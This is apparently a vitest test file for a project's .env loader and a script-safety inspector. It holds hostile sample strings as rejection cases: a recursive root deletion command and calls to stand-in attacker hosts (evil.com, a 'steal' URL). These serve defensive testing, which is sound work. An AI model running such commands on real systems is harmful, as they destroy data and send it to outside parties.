import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "fs";
import path from "path";
import os from "os";
import { loadDotenv, validateTestScriptSafety } from "../index";

describe("loadDotenv parser", () => {
  let tmpDir: string;
  let envFile: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "valkyrie-dotenv-test-"));
    envFile = path.join(tmpDir, ".env");
  });

  afterEach(() => {
    if (fs.existsSync(tmpDir)) {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("should parse key=value lines and set process.env", () => {
    fs.writeFileSync(envFile, "TEST_PORT=9090\nTEST_NAME=\"Valkyrie\"\n# Comment line\nTEST_SINGLE='Value'\n");
    loadDotenv(envFile);

    expect(process.env.TEST_PORT).toBe("9090");
    expect(process.env.TEST_NAME).toBe("Valkyrie");
    expect(process.env.TEST_SINGLE).toBe("Value");

    delete process.env.TEST_PORT;
    delete process.env.TEST_NAME;
    delete process.env.TEST_SINGLE;
  });

  it("should handle missing file gracefully without crashing", () => {
    expect(() => {
      loadDotenv("/path/to/nonexistent/.env");
    }).not.toThrow();
  });
});

describe("validateTestScriptSafety security inspector", () => {
  it("should pass safe test assertions", () => {
    const safeJs = "const assert = require('assert'); assert.strictEqual(1 + 1, 2);";
    const safePy = "import unittest\nclass TestApp(unittest.TestCase):\n  def test_math(self):\n    self.assertEqual(1+1, 2)";
    expect(validateTestScriptSafety(safeJs).safe).toBe(true);
    expect(validateTestScriptSafety(safePy).safe).toBe(true);
  });

  it("should reject dangerous subprocess or external network calls", () => {
    expect(validateTestScriptSafety("require('child_process').exec('ls')").safe).toBe(false);
    expect(validateTestScriptSafety("import os\nos.system('rm -rf /')").safe).toBe(false);
    expect(validateTestScriptSafety("import subprocess\nsubprocess.Popen(['curl', 'http://evil.com'])").safe).toBe(false);
    expect(validateTestScriptSafety("fetch('https://malicious-domain.com/steal')").safe).toBe(false);
  });
});
